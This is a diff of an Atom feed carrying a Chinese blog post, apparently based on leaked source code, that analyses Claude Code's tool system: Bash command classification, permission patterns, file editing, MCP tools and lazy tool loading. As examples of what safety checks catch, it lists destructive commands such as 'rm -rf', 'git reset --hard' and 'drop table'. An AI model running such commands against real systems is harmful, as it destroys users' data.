+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;BASH_SILENT_COMMANDS &lt;&#x2F;span&gt;&lt;span&gt;= new Set([&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;mv&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;cp&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rm&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;mkdir&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;chmod&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;])
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;BASH_SEMANTIC_NEUTRAL &lt;&#x2F;span&gt;&lt;span&gt;= new Set([&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;])
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;对管道命令，&lt;strong&gt;所有部分&lt;&#x2F;strong&gt;都必须是搜索&#x2F;读取命令才算只读。&lt;code&gt;cat file | grep pattern&lt;&#x2F;code&gt; 是只读的，&lt;code&gt;cat file | rm -rf&lt;&#x2F;code&gt; 不是。语义中性命令（echo, true, false）在任何位置都不影响判断。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;2. sed 编辑检测（&lt;code&gt;sedEditParser.ts&lt;&#x2F;code&gt;）&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;sed&lt;&#x2F;code&gt; 命令特殊处理——它的一些用法是读操作（&lt;code&gt;sed -n &#x27;p&#x27;&lt;&#x2F;code&gt;），一些是写操作（&lt;code&gt;sed -i &#x27;s&#x2F;old&#x2F;new&#x2F;&#x27;&lt;&#x2F;code&gt;）。有专门的解析器来判断。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;3. 路径校验（&lt;code&gt;pathValidation.ts&lt;&#x2F;code&gt;）&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;检查命令是否在操作允许的路径。这跟沙箱系统联动。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;4. 只读约束（&lt;code&gt;readOnlyValidation.ts&lt;&#x2F;code&gt;）&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;在 Plan Mode 下，所有写操作被禁止。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;5. 破坏性命令警告（&lt;code&gt;destructiveCommandWarning.ts&lt;&#x2F;code&gt;）&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;rm -rf&lt;&#x2F;code&gt;、&lt;code&gt;git reset --hard&lt;&#x2F;code&gt;、&lt;code&gt;drop table&lt;&#x2F;code&gt; 等命令触发额外警告。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;quan-xian-pi-pei&quot;&gt;权限匹配&lt;&#x2F;h3&gt;
+&lt;p&gt;&lt;code&gt;bashPermissions.ts&lt;&#x2F;code&gt;（2,621 行）实现了 Bash 专用的权限匹配。因为 Bash 的权限不是简单的&amp;quot;允许&#x2F;拒绝&amp;quot;——它支持通配符模式匹配：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;Bash(git *)        — 允许所有 git 子命令
+&lt;&#x2F;span&gt;&lt;span&gt;Bash(npm run *)    — 允许所有 npm scripts
+&lt;&#x2F;span&gt;&lt;span&gt;Bash(rm *)         — 允许删除（如果用户真的这么配置了）
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;shu-chu-chu-li&quot;&gt;输出处理&lt;&#x2F;h3&gt;
+&lt;p&gt;Bash 命令的输出也需要特殊处理：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;图片检测&lt;&#x2F;strong&gt;：如果输出包含图片数据（iTerm 内联图片协议），转成多模态内容&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;大输出持久化&lt;&#x2F;strong&gt;：超过 &lt;code&gt;maxResultSizeChars&lt;&#x2F;code&gt; 的输出存到磁盘，返回预览 + 文件路径&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;空行清理&lt;&#x2F;strong&gt;：&lt;code&gt;stripEmptyLines&lt;&#x2F;code&gt;——过多空行浪费 token&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;背景任务&lt;&#x2F;strong&gt;：&lt;code&gt;run_in_background&lt;&#x2F;code&gt; 参数支持后台执行，完成后通知&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;fileedittool-bu-zhi-shi-xie-wen-jian&quot;&gt;FileEditTool：不只是写文件&lt;&#x2F;h2&gt;
+&lt;p&gt;FileEdit 不是简单的&amp;quot;写入内容&amp;quot;——它实现了 &lt;strong&gt;diff 语义&lt;&#x2F;strong&gt;的文件编辑。&lt;&#x2F;p&gt;
+&lt;p&gt;关键设计决策：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;export const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FILE_UNEXPECTEDLY_MODIFIED_ERROR &lt;&#x2F;span&gt;&lt;span&gt;=
+&lt;&#x2F;span&gt;&lt;span&gt;  &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;File has been unexpectedly modified. Read it again before attempting to write it.&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;每次编辑前会检查文件是否被外部修改过。如果上次读取之后文件变了——拒绝编辑，要求重新读取。这防止了一类严重 bug：模型基于过时的文件内容做编辑，覆盖了用户刚做的修改。&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;filereadtool-bu-zhi-du-wen-ben&quot;&gt;FileReadTool：不止读文本&lt;&#x2F;h2&gt;
+&lt;p&gt;FileRead 支持读取的内容远超纯文本：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;图片&lt;&#x2F;strong&gt;（PNG, JPG）：返回多模态内容，Claude 直接&amp;quot;看&amp;quot;图片&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;PDF&lt;&#x2F;strong&gt;：大文件必须指定页码范围（&amp;gt;10 页必须 &lt;code&gt;pages: &amp;quot;1-5&amp;quot;&lt;&#x2F;code&gt;）&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Jupyter Notebook&lt;&#x2F;strong&gt;：解析 &lt;code&gt;.ipynb&lt;&#x2F;code&gt;，返回所有 cell 及其输出&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;截图&lt;&#x2F;strong&gt;：用户提供路径时直接查看&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; prompt.ts 中的说明：
+&lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;This tool allows Claude Code to read images (eg PNG, JPG, etc). 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;When reading an image file the contents are presented visually 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;as Claude Code is a multimodal LLM.&lt;&#x2F;span&gt;&lt;span&gt;`
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;还有一个细节：&lt;code&gt;FILE_UNCHANGED_STUB&lt;&#x2F;code&gt;。如果文件自上次读取后没有变化，返回一段提示而不是重新发送全部内容——&lt;strong&gt;省 token&lt;&#x2F;strong&gt;。&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;export const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FILE_UNCHANGED_STUB &lt;&#x2F;span&gt;&lt;span&gt;=
+&lt;&#x2F;span&gt;&lt;span&gt;  &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;File unchanged since last read. The content from the earlier Read&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt; &lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;tool_result &lt;&#x2F;span&gt;&lt;span&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this conversation is still current&lt;&#x2F;span&gt;&lt;span&gt;.&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;mcp-gong-ju-dong-tai-zhu-ce-de-mo-neng-gua-pei-qi&quot;&gt;MCP 工具：动态注册的万能适配器&lt;&#x2F;h2&gt;
+&lt;p&gt;MCP（Model Context Protocol）工具不是预定义的——它们从 MCP Server 动态注册。&lt;code&gt;MCPTool.ts&lt;&#x2F;code&gt;（1,086 行）是一个通用适配器：&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;连接 MCP Server，获取它提供的工具列表&lt;&#x2F;li&gt;
+&lt;li&gt;每个 MCP 工具被包装成一个标准 Tool 接口&lt;&#x2F;li&gt;
+&lt;li&gt;工具名用 &lt;code&gt;mcp__&amp;lt;server&amp;gt;__&amp;lt;tool&amp;gt;&lt;&#x2F;code&gt; 格式避免冲突&lt;&#x2F;li&gt;
+&lt;li&gt;权限走标准的 Permission 系统&lt;&#x2F;li&gt;
+&lt;li&gt;分类器输入走标准的 &lt;code&gt;toAutoClassifierInput&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;isMcp&lt;&#x2F;span&gt;&lt;span&gt;?: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;boolean  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Tool 接口上的标记
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mcpInfo&lt;&#x2F;span&gt;&lt;span&gt;?: { serverName: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;toolName&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;string &lt;&#x2F;span&gt;&lt;span&gt;}  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 原始 MCP 名称
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;关键决策：MCP 工具跟内置工具共享&lt;strong&gt;完全相同的权限和安全框架&lt;&#x2F;strong&gt;。不存在&amp;quot;MCP 工具特权&amp;quot;或&amp;quot;MCP 工具豁免&amp;quot;——外部工具的安全标准跟内置工具一样高。&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;gong-ju-zhu-ce-bian-yi-shi-cai-jian&quot;&gt;工具注册：编译时裁剪&lt;&#x2F;h2&gt;
+&lt;p&gt;工具注册在 &lt;code&gt;tools.ts&lt;&#x2F;code&gt;（389 行）里。有趣的是，很多工具被 feature flag 守卫：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SleepTool &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;feature&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;PROACTIVE&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) || &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;feature&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;KAIROS&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
+&lt;&#x2F;span&gt;&lt;span&gt;  ? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;.&#x2F;tools&#x2F;SleepTool&#x2F;SleepTool.js&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SleepTool
+&lt;&#x2F;span&gt;&lt;span&gt;  : &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;null
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cronTools &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;feature&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;AGENT_TRIGGERS&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
+&lt;&#x2F;span&gt;&lt;span&gt;  ? [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CronCreateTool&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CronDeleteTool&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CronListTool&lt;&#x2F;span&gt;&lt;span&gt;]
+&lt;&#x2F;span&gt;&lt;span&gt;  : []
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MonitorTool &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;feature&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;MONITOR_TOOL&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
+&lt;&#x2F;span&gt;&lt;span&gt;  ? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;.&#x2F;tools&#x2F;MonitorTool&#x2F;MonitorTool.js&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MonitorTool
+&lt;&#x2F;span&gt;&lt;span&gt;  : &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;null
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;外部构建里，这些 feature flag 在编译时被解析为 &lt;code&gt;false&lt;&#x2F;code&gt;，整个 require 连同工具代码一起被 tree-shaking 移除。&lt;strong&gt;外部用户的 Claude Code 二进制文件里根本不包含这些工具的代码。&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;这意味着 Anthropic 内部版的 Claude Code 比外部版多了很多工具：Sleep（自主模式休眠）、Cron（定时任务）、Monitor（后台进程监控）、REPL（Jupyter-like 交互环境）、RemoteTrigger（远程触发）等。&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;toolsearch-gong-ju-tai-duo-zen-yao-ban&quot;&gt;ToolSearch：工具太多怎么办&lt;&#x2F;h2&gt;
+&lt;p&gt;40+ 个工具全放进 API 调用的 tool schema 里，会占用大量 token。&lt;code&gt;ToolSearchTool&lt;&#x2F;code&gt; 解决了这个问题：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;readonly shouldDefer&lt;&#x2F;span&gt;&lt;span&gt;?: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;boolean    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 延迟加载
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;readonly alwaysLoad&lt;&#x2F;span&gt;&lt;span&gt;?: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;boolean     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 始终加载
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;searchHint&lt;&#x2F;span&gt;&lt;span&gt;?: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;string               &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 搜索关键词
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;不常用的工具标记为 &lt;code&gt;shouldDefer: true&lt;&#x2F;code&gt;，不包含在初始 prompt 里。模型需要时先调用 ToolSearch，通过关键词找到工具，然后工具才被加载到当前会话。&lt;&#x2F;p&gt;
+&lt;p&gt;核心工具（FileRead, FileWrite, Bash 等）标记为 &lt;code&gt;alwaysLoad: true&lt;&#x2F;code&gt;，始终可用。&lt;&#x2F;p&gt;
+&lt;p&gt;这是一个&lt;strong&gt;懒加载的工具系统&lt;&#x2F;strong&gt;——跟代码里的 &lt;code&gt;import()&lt;&#x2F;code&gt; 动态导入异曲同工。&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;da-xing-shu-chu-de-chi-jiu-hua&quot;&gt;大型输出的持久化&lt;&#x2F;h2&gt;
+&lt;p&gt;当工具输出超过 &lt;code&gt;maxResultSizeChars&lt;&#x2F;code&gt; 时，Claude Code 不会把全部内容塞进消息历史——那会吃掉大量 context window。相反，它把结果存到磁盘，只返回预览：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span&gt;maxResultSizeChars: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;number  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 每个工具自己设置阈值
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; FileReadTool 设为 Infinity——因为持久化读取结果会创建循环
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; （Read→文件→Read→文件→...），而且 Read 本身已经有行数限制
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;大输出存储后，返回一个 &lt;code&gt;buildLargeToolResultMessage&lt;&#x2F;code&gt;，包含前 N 字节的预览和文件路径。模型可以用 FileRead 去读完整结果——但只有在需要时才读。&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;she-ji-yuan-ze-ti-lian&quot;&gt;设计原则提炼&lt;&#x2F;h2&gt;
+&lt;p&gt;读完 Claude Code 的工具系统，几个设计原则值得借鉴：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;1. 接口统一，实现自由&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;40 个工具共享同一个 Tool 接口，但每个工具自己决定：什么算只读、什么信息暴露给分类器、什么时候需要权限。框架不试图&amp;quot;理解&amp;quot;每个工具——它只定义契约。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;2. 安全是接口的一部分&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;toAutoClassifierInput&lt;&#x2F;code&gt;、&lt;code&gt;isReadOnly&lt;&#x2F;code&gt;、&lt;code&gt;isDestructive&lt;&#x2F;code&gt;、&lt;code&gt;checkPermissions&lt;&#x2F;code&gt; 都是接口的必需方法。安全不是事后补丁——你不能创建一个工具而不考虑它的安全属性。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;3. 复杂度集中处理&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Bash 工具占了全部工具代码的 30%（12,411 &#x2F; ~40,000），因为 Bash 的安全问题最复杂。与其在框架层做不完美的通用安全检查，不如让 Bash 自己用 7,000 行 AST 解析器做精确的安全分析。&lt;strong&gt;复杂度应该在产生它的地方处理。&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;4. 懒加载不只是性能优化&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;ToolSearch 的延迟加载不只是省 token——它减少了模型的决策空间。40 个工具同时呈现时，模型需要花更多 token 来&amp;quot;思考&amp;quot;用哪个。按需加载让模型专注于当前任务需要的工具。&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;xia-yi-pian&quot;&gt;下一篇&lt;&#x2F;h2&gt;
+&lt;p&gt;工具系统讲完了。下一篇进入最精妙的安全设计——&lt;strong&gt;权限与安全：yoloClassifier 和四层防护&lt;&#x2F;strong&gt;。&lt;&#x2F;p&gt;
+&lt;p&gt;一个名字叫 yolo 的安全分类器，一个两阶段的 XML 解析协议，一个&amp;quot;快速判断 + chain-of-thought 复核&amp;quot;的减少误报策略。这是 Claude Code 用 LLM 来审查 LLM 的完整方案。&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;p&gt;📚 &lt;strong&gt;CC解构系列&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;篇目&lt;&#x2F;th&gt;&lt;th&gt;日期&lt;&#x2F;th&gt;&lt;th&gt;主题&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;thead&gt;&lt;tbody&gt;
+&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;&#x2F;claude-code-leaked-butterfly-effect&quot;&gt;序&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&lt;td&gt;2026-03-31&lt;&#x2F;td&gt;&lt;td&gt;一个 .map 文件的蝴蝶效应&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;&#x2F;claude-code-architecture-overview&quot;&gt;第 1 篇&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&lt;td&gt;2026-04-01&lt;&#x2F;td&gt;&lt;td&gt;380K 行代码的骨架&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;&#x2F;claude-code-system-prompt-design&quot;&gt;第 2 篇&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&lt;td&gt;2026-04-02&lt;&#x2F;td&gt;&lt;td&gt;灵魂工程：System Prompt 的七层设计&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;第 3 篇&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;2026-04-03&lt;&#x2F;td&gt;&lt;td&gt;40 个工具的统一抽象&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;第 4 篇&lt;&#x2F;td&gt;&lt;td&gt;2026-04-04&lt;&#x2F;td&gt;&lt;td&gt;权限与安全：yoloClassifier 和四层防护&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;...&lt;&#x2F;td&gt;&lt;td&gt;...&lt;&#x2F;td&gt;&lt;td&gt;&lt;em&gt;持续更新&lt;&#x2F;em&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
+</content>
+        
+    </entry>
     <entry xml:lang="en">
         <title>[CC解构] 灵魂工程：System Prompt 的七层设计</title>
         <published>2026-04-02T00:00:00+00:00</published>
